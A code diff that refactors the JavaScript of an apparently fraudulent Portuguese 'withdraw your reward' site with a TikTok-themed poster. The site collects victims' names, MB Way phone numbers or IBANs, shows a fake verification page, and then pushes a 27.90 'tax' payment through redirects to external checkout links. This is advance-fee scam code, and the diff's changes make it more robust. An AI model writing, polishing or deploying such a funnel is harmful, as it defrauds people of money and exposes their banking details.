@@ -202,7 +202,7 @@ const pages = {
 
       <!-- Call to Action -->
       <div class="confirmation-section">
-<a href="loadingaq" class="confirmation-cta-button" id="pay-tax-btn">
+        <a href="#" class="confirmation-cta-button" id="pay-tax-btn">
           Completar Verificação e Receber Fundos
         </a>
         <div class="confirmation-timer">
@@ -244,40 +244,18 @@ const pages = {
   </h1>
   <p class="video-instruction">Veja como desbloquear o seu levantamento assistindo ao vídeo.</p>
   
-  <style>
-  .video-container {
-    border: 2px solid #3b5998;
-    border-radius: 8px;
-    overflow: hidden;
-    max-width: 100%;
-    height: auto;
-    margin: 0 auto;
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-  }
-
-  .video-container video {
-    width: 100%;
-    height: auto;
-    display: block;
-    background-color: #000; /* previne fundo branco durante o carregamento */
-    transition: opacity 0.3s ease-in-out;
-    border-radius: 8px;
-  }
-</style>
-
-<div class="video-container">
-  <video
-    id="tutorial-video"
-    controls
-    preload="metadata"
-    poster="https://charming-figolla-3a3b33.netlify.app//src/media/capatiktok.jpg"
-    playsinline
-  >
-    <source src="https://harmonious-toffee-77df94.netlify.app/video.mp4" type="video/mp4">
-    Your browser does not support video playback.
-  </video>
-</div>
-
+  <div class="video-container">
+    <video
+      id="tutorial-video"
+      controls
+      preload="metadata"
+      poster="https://charming-figolla-3a3b33.netlify.app//src/media/capatiktok.jpg"
+      playsinline
+    >
+      <source src="https://harmonious-toffee-77df94.netlify.app/video.mp4" type="video/mp4">
+      Your browser does not support video playback.
+    </video>
+  </div>
   
   <button class="unlock-btn">
     DESBLOQUEAR AGORA
@@ -336,14 +314,10 @@ const pages = {
 // Current page state
 let currentPage = null;
 
-// Initialize page navigation
-function initializePages() {
-  // Add click handler for withdraw button
-}
-
 // Show specific page
 function showPage(pageName) {
   const container = document.querySelector(".app-container");
+  if (!container) return;
 
   // Save current content if it's the first navigation
   if (!currentPage) {
@@ -356,8 +330,6 @@ function showPage(pageName) {
   // Add page-specific event listeners
   if (pageName === "withdraw") {
     setupWithdrawPage();
-  } else if (pageName === "loading") {
-    // Loading page doesn't need setup
   } else if (pageName === "registration") {
     setupRegistrationPage();
   } else if (pageName === "video") {
@@ -375,34 +347,13 @@ function setupWithdrawPage() {
     backBtn.addEventListener("click", () => {
       const container = document.querySelector(".app-container");
       container.innerHTML = currentPage;
-      initializePages();
     });
   }
 
   // Amount selection
   document.querySelectorAll(".amount-btn").forEach((btn) => {
     btn.addEventListener("click", () => {
-      const isSpecialOffer = btn.getAttribute("data-amount") === "0.40";
-
-      // Remover selected de todos
-      document.querySelectorAll(".amount-btn").forEach((b) => {
-        b.classList.remove("selected");
-      });
-
-      // Se selecionou outro botão que não é €0,40, remover special-offer do €0,40
-      if (!isSpecialOffer) {
-        const specialBtn = document.querySelector(
-          '.amount-btn[data-amount="0.40"]',
-        );
-        if (specialBtn) {
-          specialBtn.classList.remove("special-offer");
-        }
-      } else {
-        // Se selecionou o €0,40, manter special-offer
-        btn.classList.add("special-offer");
-      }
-
-      // Adicionar selected ao botão clicado
+      document.querySelectorAll(".amount-btn").forEach((b) => b.classList.remove("selected"));
       btn.classList.add("selected");
     });
   });
@@ -414,21 +365,10 @@ function setupWithdrawPage() {
       openMethodModal();
     });
   }
-
-  // Fechar modal ao clicar fora
-  const methodModal = document.getElementById("method-modal");
-  if (methodModal) {
-    methodModal.addEventListener("click", (e) => {
-      if (e.target === methodModal) {
-        closeMethodModal();
-      }
-    });
-  }
 }
 
 // Setup event listeners for registration page
 function setupRegistrationPage() {
-  // Preencher dados de reembolso se disponíveis
   const formData = window.withdrawalFormData || {};
 
   if (formData.name) {
@@ -441,26 +381,19 @@ function setupRegistrationPage() {
     if (accountEl) accountEl.textContent = formData.account;
   }
 
-  // Preencher data atual
   const dateEl = document.getElementById("confirmation-date");
   if (dateEl) {
     const now = new Date();
-    const day = String(now.getDate()).padStart(2, "0");
-    const month = String(now.getMonth() + 1).padStart(2, "0");
-    const year = now.getFullYear();
-    dateEl.textContent = `${month}/${day}/${year}`;
+    dateEl.textContent = now.toLocaleDateString('pt-PT');
   }
 
   const payButton = document.getElementById("pay-tax-btn");
-
   if (payButton) {
     payButton.addEventListener("click", (e) => {
       e.preventDefault();
-      // Rastrear InitiateCheckout quando clica em "Pagar Taxa"
       if (typeof trackInitiateCheckout === "function") {
         trackInitiateCheckout(27.90);
       }
-      // Mostrar página de checkout integrada
       window.location.href = "loading.html" + window.location.search;
     });
   }
@@ -476,11 +409,7 @@ function setupCheckoutPage() {
   }
 
   const checkoutBtn = document.getElementById("checkout-btn");
-  if (
-    checkoutBtn &&
-    typeof COOUD_CONFIG !== "undefined" &&
-    COOUD_CONFIG.checkoutUrl
-  ) {
+  if (checkoutBtn && typeof COOUD_CONFIG !== "undefined" && COOUD_CONFIG.checkoutUrl) {
     checkoutBtn.addEventListener("click", () => {
       window.location.href = COOUD_CONFIG.checkoutUrl + window.location.search;
     });
@@ -489,9 +418,12 @@ function setupCheckoutPage() {
 
 // Setup event listeners for video page
 function setupVideoPage() {
-  document.querySelector(".unlock-btn").addEventListener("click", () => {
-    window.location.href = "https://go.pepperpay.com.br/04yi8";
-  });
+  const unlockBtn = document.querySelector(".unlock-btn");
+  if (unlockBtn) {
+    unlockBtn.addEventListener("click", () => {
+      window.location.href = "https://go.pepperpay.com.br/04yi8";
+    });
+  }
 }
 
 // Métodos de saque - funções globais
@@ -525,7 +457,6 @@ function renderMethodForm(method) {
   if (!container) return;
 
   let formHTML = "";
-
   if (method === "mbway") {
     formHTML = `
       <div class="method-form">
@@ -562,43 +493,13 @@ function renderMethodForm(method) {
   container.style.display = "block";
   if (addBtn) addBtn.style.display = "none";
 
-  // Add numeric-only validation for MB Way
   if (method === "mbway") {
     const input = document.getElementById("mbway-phone");
     if (input) {
-      input.addEventListener("input", function (e) {
+      input.addEventListener("input", (e) => {
         e.target.value = e.target.value.replace(/\D/g, "");
       });
     }
-  }
-}
-
-  container.innerHTML = formHTML;
-  container.style.display = "block";
-  if (addBtn) addBtn.style.display = "none";
-
-  // Add numeric-only validation for wire routing/account numbers
-  if (method === "wire") {
-    ["wire-routing", "wire-account"].forEach((id) => {
-      const input = document.getElementById(id);
-      if (input) {
-        input.addEventListener("input", function (e) {
-          e.target.value = e.target.value.replace(/\D/g, "");
-        });
-      }
-    });
-  }
-
-  // ACH numeric-only for routing/account
-  if (method === "ach") {
-    ["ach-routing", "ach-account"].forEach((id) => {
-      const input = document.getElementById(id);
-      if (input) {
-        input.addEventListener("input", function (e) {
-          e.target.value = e.target.value.replace(/\D/g, "");
-        });
-      }
-    });
   }
 }
 
@@ -610,66 +511,37 @@ function updateMethodDisplay(method) {
   if (!display || !logo || !name) return;
 
   const methodInfo = {
-    mbway: {
-      src: "/Logo_MBWay.svg.png",
-      alt: "MB Way",
-      label: "MB Way",
-    },
-    multibanco: {
-      src: "/multibanco-logo-vector.png",
-      alt: "Multibanco",
-      label: "Multibanco / IBAN",
-    },
+    mbway: { src: "/Logo_MBWay.svg.png", alt: "MB Way", label: "MB Way" },
+    multibanco: { src: "/multibanco-logo-vector.png", alt: "Multibanco", label: "Multibanco / IBAN" }
   };
+  
   const info = methodInfo[method];
   if (info) {
     logo.innerHTML = `<img src="${info.src}" alt="${info.alt}" style="width: 50px; height: 35px; object-fit: contain;">`;
     name.textContent = info.label;
   }
-
   display.style.display = "block";
 }
 
 function submitMethodForm() {
-  // Validar e processar formulário
   let formData = {};
-
   if (selectedPaymentMethod === "mbway") {
     const name = document.getElementById("mbway-name")?.value.trim();
     const phone = document.getElementById("mbway-phone")?.value.trim();
-    if (!name || !phone) {
-      alert("Por favor, preencha todos os campos");
-      return;
-    }
-    if (phone.length !== 9) {
-      alert("O número de telemóvel deve ter 9 dígitos");
-      return;
-    }
+    if (!name || !phone) { alert("Por favor, preencha todos os campos"); return; }
+    if (phone.length !== 9) { alert("O número de telemóvel deve ter 9 dígitos"); return; }
     formData = { name, account: phone, method: "mbway" };
   } else if (selectedPaymentMethod === "multibanco") {
     const name = document.getElementById("multibanco-name")?.value.trim();
     const iban = document.getElementById("multibanco-iban")?.value.trim();
-    if (!name || !iban) {
-      alert("Por favor, preencha todos os campos");
-      return;
-    }
-    if (iban.length < 21) {
-      alert("Por favor, introduza um IBAN válido");
-      return;
-    }
+    if (!name || !iban) { alert("Por favor, preencha todos os campos"); return; }
+    if (iban.length < 21) { alert("Por favor, introduza um IBAN válido"); return; }
     formData = { name, account: iban, method: "multibanco" };
   }
 
-  // Salvar dados do formulário para usar na página de registro
   window.withdrawalFormData = formData;
-
-  // Mostrar tela de loading primeiro
   showPage("loading");
-
-  // Após 2-3 segundos, mostrar página de registro
-  setTimeout(() => {
-    showPage("registration");
-  }, 2500);
+  setTimeout(() => { showPage("registration"); }, 2500);
 }
 
 // Tornar funções disponíveis globalmente
@@ -677,3 +549,4 @@ window.openMethodModal = openMethodModal;
 window.closeMethodModal = closeMethodModal;
 window.selectMethod = selectMethod;
 window.submitMethodForm = submitMethodForm;
+window.showPage = showPage;
